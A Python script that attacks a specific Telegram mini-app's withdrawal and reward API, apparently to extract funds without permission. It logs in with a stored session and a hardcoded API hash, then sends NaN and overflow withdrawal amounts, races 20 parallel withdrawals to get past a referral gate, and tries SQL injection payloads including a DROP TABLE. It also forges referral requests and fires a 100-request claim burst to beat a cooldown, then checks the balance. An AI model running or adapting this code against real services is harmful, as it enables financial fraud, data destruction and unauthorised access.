"""Race gate 8 ref + NaN amount + SQL inject."""
import sys, os, time, asyncio, json, threading
from concurrent.futures import ThreadPoolExecutor, as_completed
sys.path.insert(0, os.getcwd())
import httpx, storage
storage.init()

BASE = "https://result-gotta-responsibility-firewire.trycloudflare.com"
UA = {"User-Agent":"Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Mobile Safari/537.36",
      "Origin":BASE, "Referer":BASE+"/", "content-type":"application/json"}

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.messages import RequestWebViewRequest
from urllib.parse import unquote

fox = [a for a in storage.list_accounts() if a.get("uid") == 8249205817][0]
async def fetch_idata():
    c = TelegramClient(StringSession(fox["session"]), 2040, "b18441a1ff607e10a989891a5462e627")
    await c.connect()
    try:
        bot = await c.get_entity("ThoDaoVang_bot")
        res = await c(RequestWebViewRequest(peer=bot, bot=bot, platform="android",
            url=BASE+"/", from_bot_menu=True, compact=True))
        fr = res.url.split("#tgWebAppData=",1)[1].split("&tgWebAppVersion")[0]
        return unquote(fr)
    finally:
        await c.disconnect()

idata = asyncio.new_event_loop().run_until_complete(fetch_idata())
H = {**UA, "X-Telegram-Init-Data": idata}

# ============ 1. NaN/Inf amount ============
print("=== 1. NaN / Inf AMOUNT ===")
import math
for val_str in ["NaN", "Infinity", "-Infinity", "nan", "inf", "1e309",
                "999999999999999999999999999999999999999",
                "1E+400"]:
    body = '{"amount":' + val_str + '}'
    try:
        r = httpx.post(BASE+"/api/withdraw", content=body.encode(),
                       headers={**H, "content-type":"application/json"}, timeout=15)
        tag = ""
        if "tối thiểu" not in r.text and "không hợp lệ" not in r.text and "CHƯA ĐƯỢC" not in r.text:
            tag = " !!! DIFFERENT"
        print(f"    amount={val_str:<40} -> {r.status_code}  {r.text[:130]}{tag}")
    except Exception as e:
        print(f"    {val_str} err")

# ============ 2. Race 8 refs gate ============
print("\n=== 2. RACE WITHDRAW GATE (20 song song) ===")
# Gui 20 request cung luc de check gate 8 ref
def race(i):
    try:
        r = httpx.post(BASE+"/api/withdraw", json={"amount":2000000}, headers=H, timeout=20)
        return r.status_code, r.text[:200]
    except Exception as e:
        return 0, str(e)[:60]
with ThreadPoolExecutor(max_workers=20) as ex:
    res = [f.result() for f in as_completed([ex.submit(race,i) for i in range(20)])]
# Thong ke response
unique = {}
for s, t in res:
    key = (s, t[:80])
    unique[key] = unique.get(key, 0) + 1
for (s, t), count in unique.items():
    print(f"    x{count}  {s}  {t}")

# ============ 3. SQL INJECTION ============
print("\n=== 3. SQL INJECTION ===")
sql_payloads = [
    "0000000256'",
    "0000000256' OR '1'='1",
    "0000000256' OR 1=1--",
    "0000000256; DROP TABLE users--",
    "0000000256' UNION SELECT 1,2,3--",
    "' OR '1'='1",
    "admin'--",
]
for p in sql_payloads:
    # Thu trong header init-data (bypass)
    try:
        # Thu trong member_id query
        r = httpx.get(BASE+f"/api/me?member_id={p}", headers=H, timeout=10)
        tag = ""
        if r.status_code != 200 or "member_id" not in r.text:
            tag = " !!!"
        if tag:
            print(f"    GET me?member_id={p} -> {r.status_code}  {r.text[:120]}{tag}")
    except: pass

# ============ 4. Bypass gate qua ref apply ============
print("\n=== 4. FAKE REF APPLY ===")
# Thu POST /api/referral/apply qua cac path khac
for path in ["/api/referral/apply", "/api/ref/apply", "/api/user/ref",
             "/api/user/referral", "/api/referral/add", "/api/ref/add",
             "/api/ref/claim", "/api/invite", "/api/invite/apply"]:
    for body in [{"ref":"0000000002"}, {"ref_code":"0000000002"},
                 {"referrer":"0000000002"}, {"code":"0000000002"}]:
        try:
            r = httpx.post(BASE+path, json=body, headers=H, timeout=8)
            if r.status_code != 404:
                print(f"    POST {path} {body} -> {r.status_code}  {r.text[:130]}")
        except: pass

# ============ 5. GET ref apply ============
print("\n=== 5. GET REF APPLY ===")
for path in [f"/api/referral?ref=0000000002", f"/api/ref?code=0000000002",
             f"/api/referral/apply?ref=0000000002"]:
    try:
        r = httpx.get(BASE+path, headers=H, timeout=8)
        if r.status_code != 404:
            print(f"    GET {path} -> {r.status_code}  {r.text[:150]}")
    except: pass

# ============ 6. DoS claim — 100 request burst ============
print("\n=== 6. CLAIM BURST (100 sau khi cho 55s) ===")
# Reset cooldown truoc
time.sleep(1)
r = httpx.post(BASE+"/api/claim", headers=H, timeout=15)
print(f"    trigger reset: {r.json().get('ok')}")
# Doi 55s
print("    doi 55s...")
time.sleep(55)
# Burst 100 request
def brst(i):
    try:
        r = httpx.post(BASE+"/api/claim", headers=H, timeout=15)
        return r.json()
    except: return {}
with ThreadPoolExecutor(max_workers=30) as ex:
    res = [f.result() for f in as_completed([ex.submit(brst,i) for i in range(100)])]
accepted = [j for j in res if j.get("ok")]
total = sum(j.get("claimed",0) for j in accepted)
print(f"    accepted: {len(accepted)}/100  total_claimed: {total:,.0f}")

# ============ 7. FINAL ============
me = httpx.get(BASE+"/api/me", headers=H, timeout=10).json()
print(f"\n=== 7. FINAL ===")
print(f"    balance: {me.get('balance'):,.0f}")
print(f"    referrals: {me.get('referrals')}")
